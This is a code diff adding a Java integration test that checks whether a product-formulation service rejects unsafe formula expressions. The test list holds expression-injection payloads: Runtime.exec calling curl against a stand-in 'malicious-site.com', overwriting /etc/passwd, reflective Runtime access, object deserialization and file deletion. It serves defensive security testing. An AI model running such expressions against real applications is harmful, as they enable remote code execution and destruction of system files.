@@ -79,6 +79,46 @@ public class FormulaFormulationIT extends AbstractFinishedProductTest {
 	}
 
 	@Test
+	public void testUnsafeFormulas() {
+
+		List<String> unsafeFormulas = List.of("T(java.lang.Runtime).getRuntime().exec('curl http://malicious-site.com')",
+				"T(java.nio.file.Files).write(java.nio.file.Paths.get('/etc/passwd'), 'malicious content'.getBytes())",
+				"T(java.lang.Class).forName('java.lang.Runtime').getDeclaredMethod('getRuntime').setAccessible(true).invoke(null)",
+				"T(java.io.ObjectInputStream).newInstance(new java.io.FileInputStream('/tmp/malicious_object.ser')).readObject()",
+				"''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(''.getClass().forName('java.lang.Runtime')).exec('echo TEST')",
+				"T(sun.misc.Unsafe).getUnsafe().allocateMemory(1024 * 1024 * 10)", "T(org.apache.commons.io.FileUtils).forceDelete(new java.io.File('/path/to/sensitive/file'))");
+
+		for (String unsafeFormula : unsafeFormulas) {
+			NodeRef finishedProductDataNodeRef = inWriteTx(() -> {
+				FinishedProductData finishedProductData = new FinishedProductData();
+				finishedProductData.setName("test FP " + unsafeFormula.hashCode());
+				List<DynamicCharactListItem> dynamicCharactListItems = new ArrayList<>();
+				dynamicCharactListItems.add(new DynamicCharactListItem("formula", unsafeFormula));
+				finishedProductData.getCompoListView().setDynamicCharactList(dynamicCharactListItems);
+				alfrescoRepository.create(getTestFolderNodeRef(), finishedProductData);
+				return finishedProductData.getNodeRef();
+			});
+
+			inWriteTx(() -> {
+				L2CacheSupport.doInCacheContext(() -> AuthenticationUtil.runAsSystem(() -> {
+					return formulationService.formulate(finishedProductDataNodeRef, FormulationService.DEFAULT_CHAIN_ID);
+				}), false, true);
+				return true;
+			});
+
+			inReadTx(() -> {
+				FinishedProductData finishedProductData = (FinishedProductData) alfrescoRepository.findOne(finishedProductDataNodeRef);
+				DynamicCharactListItem dynamicCharactListItem = finishedProductData.getCompoListView().getDynamicCharactList().get(0);
+				assertTrue(dynamicCharactListItem.getErrorLog().toString().contains("Type is not authorized")
+						|| dynamicCharactListItem.getErrorLog().toString().contains("Expression is unsafe"));
+				return null;
+			});
+		}
+
+	}
+	
+	
+	@Test
 	public void testAuthorizedTypes() {
 
 		NodeRef finishedProductDataNodeRef = inWriteTx(() -> {
